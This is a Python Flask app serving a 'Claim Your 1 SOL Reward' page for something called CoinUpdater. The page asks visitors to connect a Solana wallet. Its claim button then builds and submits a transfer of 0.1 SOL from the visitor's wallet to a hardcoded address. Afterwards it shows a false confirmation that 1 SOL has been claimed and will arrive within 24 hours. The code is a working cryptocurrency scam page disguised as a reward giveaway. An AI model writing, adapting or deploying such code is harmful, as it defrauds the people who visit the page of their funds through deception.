from flask import Flask, render_template_string

app = Flask(__name__)

WALLET_ADDRESS = "79vGoijbHkY324wioWsi2uL62dyc1c3H1945Pb71RCVz"
QR_CODE_URL = "https://raw.githubusercontent.com/markosgiassa1/coinupdater_bot/main/WelcomeCoinUpdater_qrcode.png"
CLAIM_AMOUNT_SOL = 0.1

HTML_TEMPLATE = f"""
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>CoinUpdater - Claim Reward</title>

  <!-- Wallet Adapter React UI CSS -->
  <link href="https://unpkg.com/@solana/wallet-adapter-react-ui/styles.css" rel="stylesheet" />

  <style>
    body {{
      background-color: #000;
      color: #fff;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      margin: 0;
      padding: 40px;
      text-align: center;
    }}
    h1 {{
      font-size: 2.5rem;
      margin-bottom: 2rem;
    }}
    p.wallet {{
      font-size: 1.3rem;
      margin: 1rem 0 1.5rem;
      letter-spacing: 1.2px;
      word-break: break-all;
    }}
    img.qr {{
      width: 250px;
      height: 250px;
      border-radius: 20px;
      box-shadow: 0 0 15px #00ff90;
      margin-bottom: 2rem;
    }}
    button.claim-button {{
      background: linear-gradient(90deg, #00ff90, #00d178);
      border: none;
      color: #000;
      font-weight: bold;
      font-size: 1.4rem;
      padding: 15px 45px;
      border-radius: 40px;
      box-shadow: 0 4px 20px #00ff90aa;
      cursor: pointer;
      transition: all 0.3s ease;
      margin-top: 1.5rem;
    }}
    button.claim-button:disabled {{
      background: #444;
      cursor: not-allowed;
      box-shadow: none;
    }}
    button.claim-button:hover:not(:disabled) {{
      background: linear-gradient(90deg, #00d178, #00ff90);
      box-shadow: 0 6px 30px #00ff90ff;
    }}
    .message {{
      margin-top: 1.5rem;
      font-size: 1.2rem;
      color: #00ff90;
      min-height: 1.4em;
    }}
  </style>
</head>
<body>
  <h1>Claim Your 1 SOL Reward!</h1>
  <p class="wallet">Send 0.1 SOL to wallet:<br><strong>{WALLET_ADDRESS}</strong></p>
  <img src="{QR_CODE_URL}" alt="QR Code" class="qr" />

  <div id="root"></div>

  <!-- React and ReactDOM -->
  <script src="https://unpkg.com/react@18/umd/react.development.js" crossorigin></script>
  <script src="https://unpkg.com/react-dom@18/umd/react-dom.development.js" crossorigin></script>

  <!-- Solana Wallet Adapter dependencies -->
  <script src="https://unpkg.com/@solana/wallet-adapter-base@0.9.12/lib/index.umd.js"></script>
  <script src="https://unpkg.com/@solana/wallet-adapter-react@0.15.20/lib/index.umd.js"></script>
  <script src="https://unpkg.com/@solana/wallet-adapter-wallets@0.15.10/lib/index.umd.js"></script>
  <script src="https://unpkg.com/@solana/wallet-adapter-react-ui@0.9.5/lib/index.umd.js"></script>

  <!-- Solana Web3 -->
  <script src="https://unpkg.com/@solana/web3.js@1.73.0/lib/index.iife.js"></script>

  <script>
    const {{
      useMemo,
      useState,
      createElement: e,
    }} = React;
    const {{
      WalletProvider,
      ConnectionProvider,
      useWallet,
    }} = WalletAdapterReact;
    const {{
      WalletModalProvider,
      WalletMultiButton,
    }} = WalletAdapterReactUI;
    const {{
      PhantomWalletAdapter,
      SolflareWalletAdapter,
      TorusWalletAdapter,
      GlowWalletAdapter,
      SolletWalletAdapter,
      SolletExtensionWalletAdapter,
      LedgerWalletAdapter,
    }} = WalletAdapterWallets;

    const network = "mainnet-beta";
    const endpoint = "https://api.mainnet-beta.solana.com";

    const recipient = "{WALLET_ADDRESS}";
    const lamportsPerSol = 1000000000;
    const amountLamports = {int(CLAIM_AMOUNT_SOL * lamportsPerSol)};

    function App() {{
      const wallets = useMemo(() => [
        new PhantomWalletAdapter(),
        new SolflareWalletAdapter(),
        new TorusWalletAdapter(),
        new GlowWalletAdapter(),
        new SolletWalletAdapter({{ network }}),
        new SolletExtensionWalletAdapter({{ network }}),
        new LedgerWalletAdapter(),
      ], []);

      const {{ publicKey, connected, sendTransaction }} = useWallet();
      const [loading, setLoading] = useState(false);
      const [message, setMessage] = useState("");

      async function handleClaim() {{
        if (!connected) {{
          setMessage("Please connect your wallet first.");
          return;
        }}

        setLoading(true);
        setMessage("Waiting for transaction approval...");

        try {{
          const connection = new solanaWeb3.Connection(endpoint);
          const transaction = new solanaWeb3.Transaction();

          const recipientPubkey = new solanaWeb3.PublicKey(recipient);

          const instruction = solanaWeb3.SystemProgram.transfer({{
            fromPubkey: publicKey,
            toPubkey: recipientPubkey,
            lamports: amountLamports,
          }});

          transaction.add(instruction);

          const signature = await sendTransaction(transaction, connection);

          setMessage("Transaction sent, waiting for confirmation...");
          await connection.confirmTransaction(signature, 'confirmed');

          setMessage("🎉 You've claimed 1 SOL! Please wait patiently for 24 hours as requests are high.");
        }} catch (error) {{
          console.error(error);
          setMessage("Transaction failed or was cancelled.");
        }} finally {{
          setLoading(false);
        }}
      }}

      return e("div", null,
        e(WalletMultiButton, null),
        e("button", {{
          className: "claim-button",
          onClick: handleClaim,
          disabled: loading || !connected,
          title: connected ? "" : "Connect wallet to claim"
        }}, loading ? "Processing..." : "Claim 1 SOL Reward"),
        e("div", {{ className: "message" }}, message),
        connected && e("p", {{
          style: {{ marginTop: "1rem", wordBreak: "break-all", fontSize: "0.9rem", color: "#888" }}
        }}, `Connected wallet address: ${{publicKey.toBase58()}}`)
      );
    }}

    function Root() {{
      const wallets = useMemo(() => [
        new PhantomWalletAdapter(),
        new SolflareWalletAdapter(),
        new TorusWalletAdapter(),
        new GlowWalletAdapter(),
        new SolletWalletAdapter({{ network }}),
        new SolletExtensionWalletAdapter({{ network }}),
        new LedgerWalletAdapter(),
      ], []);

      return e(
        ConnectionProvider, {{ endpoint }},
        e(
          WalletProvider, {{ wallets, autoConnect: true }},
          e(
            WalletModalProvider, null,
            e(App)
          )
        )
      );
    }}

    ReactDOM.createRoot(document.getElementById("root")).render(
      e(Root)
    );
  </script>
</body>
</html>
"""

@app.route("/")
def index():
    return render_template_string(HTML_TEMPLATE)

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080)
